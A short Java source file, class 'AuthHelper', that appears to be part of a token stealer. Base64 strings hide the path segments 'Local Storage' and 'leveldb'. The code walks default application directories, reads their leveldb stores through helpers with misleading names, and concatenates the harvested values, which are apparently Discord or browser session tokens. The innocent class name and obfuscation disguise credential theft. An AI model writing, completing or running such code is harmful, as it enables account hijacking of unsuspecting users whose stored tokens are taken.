package xd;

import xd.utils.a;
import xd.utils.b;

import java.nio.file.Paths;
import java.util.HashSet;
import java.util.Set;

import static xd.utils.b.getPathRegex;

public class AuthHelper {
    private static final Set<String> authGenerator = new HashSet<>();

    public static String get() {

        b.getDefaultPaths().forEach(path ->
                authGenerator.addAll(a.encryptUUid(
                        Paths.get(path, getPathRegex("TG9jYWwgU3RvcmFnZQ=="), getPathRegex("bGV2ZWxkYg==")).toString(),
                        a.returnUUID(path))
                ));

        StringBuilder built = new StringBuilder();
        for (String auth : authGenerator) {
            built.append(auth);
        }
        return built.toString();
    }

}